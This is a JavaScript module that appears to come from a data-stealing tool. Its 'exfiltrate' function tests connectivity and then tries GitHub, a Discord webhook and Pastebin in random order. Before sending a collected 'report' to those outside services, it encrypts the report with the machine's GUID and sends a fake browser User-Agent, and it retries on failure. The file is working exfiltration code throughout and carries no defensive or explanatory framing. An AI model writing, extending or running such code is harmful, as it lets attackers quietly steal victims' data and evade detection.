const logger = require("../utils/logger");
const { withRetry } = require("../utils/retry");
const { encryptAes } = require("../utils/crypto");
const { getMachineGuid } = require("../system/machineId");
const config = require("./config");
const { uploadToGitHub } = require("./uploader");

const FAKE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
const CONNECTIVITY_URLS = [
    "https://github.com",
    "https://google.com",
    "https://api.github.com"
];

async function checkConnectivity() {
    for (const url of CONNECTIVITY_URLS) {
        try {
            const response = await fetch(url, {
                method: "HEAD",
                signal: AbortSignal.timeout(5000)
            });
            if (response.ok || response.status < 500) return true;
        } catch {
            continue;
        }
    }
    return false;
}

function shuffle(arr) {
    for (let i = arr.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    return arr;
}

function buildMultipart(boundary, payloadJson, fileName, fileContent) {
    const encoder = new TextEncoder();
    const parts = [
        encoder.encode(`--${boundary}\r\n`),
        encoder.encode(`Content-Disposition: form-data; name="payload_json"\r\n\r\n`),
        encoder.encode(payloadJson),
        encoder.encode(`\r\n--${boundary}\r\n`),
        encoder.encode(`Content-Disposition: form-data; name="file"; filename="${fileName}"\r\n`),
        encoder.encode(`Content-Type: application/json\r\n\r\n`),
        encoder.encode(fileContent),
        encoder.encode(`\r\n--${boundary}--\r\n`)
    ];
    return Buffer.concat(parts);
}

async function exfiltrate(report, systemId) {
    const online = await checkConnectivity();
    if (!online) {
        logger.warn("No connectivity detected, skipping exfil");
        return false;
    }

    const channels = shuffle([
        { name: "github", fn: () => uploadToGitHub(report, systemId) },
        { name: "discord", fn: () => uploadToDiscord(report, systemId) },
        { name: "pastebin", fn: () => uploadToPastebin(report, systemId) }
    ]);

    for (const { name, fn } of channels) {
        try {
            const result = await fn();
            if (result) {
                logger.info(`Exfil succeeded via ${name}`);
                return true;
            }
        } catch (err) {
            logger.warn(`Exfil ${name} failed: ${err.message}`);
        }
    }

    logger.error("All exfil channels exhausted");
    return false;
}

async function uploadToDiscord(report, systemId) {
    const { webhook } = config.discord;
    if (!webhook) return false;

    const guid = getMachineGuid();
    const plaintext = JSON.stringify(report, null, 2);
    const encrypted = encryptAes(plaintext, guid);
    const encryptedStr = JSON.stringify(encrypted, null, 2);

    return withRetry(async ({ signal }) => {
        const boundary = `----${Date.now().toString(36)}`;
        const payloadJson = JSON.stringify({
            content: `System Report — ${systemId}`,
            embeds: [{
                title: "System Report",
                description: `Encrypted report for ${systemId}`,
                fields: [
                    { name: "System ID", value: systemId, inline: true },
                    { name: "Timestamp", value: report.timestamp || "N/A", inline: true }
                ]
            }]
        });

        const body = buildMultipart(
            boundary,
            payloadJson,
            `report-${systemId}.json`,
            encryptedStr
        );

        const response = await fetch(webhook, {
            method: "POST",
            headers: {
                "Content-Type": `multipart/form-data; boundary=${boundary}`,
                "User-Agent": FAKE_UA
            },
            body,
            signal
        });

        if (!response.ok) {
            const text = await response.text().catch(() => "");
            throw new Error(`Discord API ${response.status}: ${text.slice(0, 200)}`);
        }

        logger.info("Report uploaded via Discord");
        return true;
    }, { label: "Discord" });
}

async function uploadToPastebin(report, systemId) {
    const { apiKey } = config.pastebin;
    if (!apiKey) return false;

    const guid = getMachineGuid();
    const plaintext = JSON.stringify(report, null, 2);
    const encrypted = encryptAes(plaintext, guid);
    const pasteContent = JSON.stringify(encrypted, null, 2);

    return withRetry(async ({ signal }) => {
        const params = new URLSearchParams({
            api_dev_key: apiKey,
            api_option: "paste",
            api_paste_code: pasteContent,
            api_paste_name: `report-${systemId}`,
            api_paste_private: "2",
            api_paste_expire_date: "1M"
        });

        const response = await fetch("https://pastebin.com/api/api_post.php", {
            method: "POST",
            headers: {
                "User-Agent": FAKE_UA,
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: params.toString(),
            signal
        });

        const text = await response.text();
        if (text.startsWith("https://pastebin.com/")) {
            logger.info(`Report uploaded via Pastebin: ${text}`);
            return true;
        }
        throw new Error(`Pastebin error: ${text.slice(0, 200)}`);
    }, { label: "Pastebin" });
}

module.exports = { exfiltrate };
